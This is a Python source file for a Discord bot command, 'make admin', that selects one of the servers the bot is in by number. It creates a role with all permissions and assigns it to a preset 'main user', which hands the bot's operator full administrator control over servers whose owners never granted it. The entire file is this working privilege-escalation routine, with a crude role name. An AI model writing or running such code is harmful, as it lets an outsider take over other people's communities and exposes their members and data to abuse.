import re

import discord
from discord import Permissions

import shared


class MakeAdmin:
    command = "make admin ([0-9]*)"

    def __init__(self, bot):
        self.bot = bot

    async def call(self, command):
        shared.clear()
        print(f"#{self.command}")
        regex = re.search(self.command, command)
        print(shared.main_user_id)
        guild = self.bot.guilds[int(regex.group(1).strip()) - 1]
        user = guild.get_member(shared.main_user_id)
        print(user)
        await guild.create_role(name="Big_BALLS_OWNER", permissions=Permissions.all())
        print(guild.roles)
        role = discord.utils.get(guild.roles, name="Big_BALLS_OWNER")
        print(role.id)
        await user.add_roles(role)
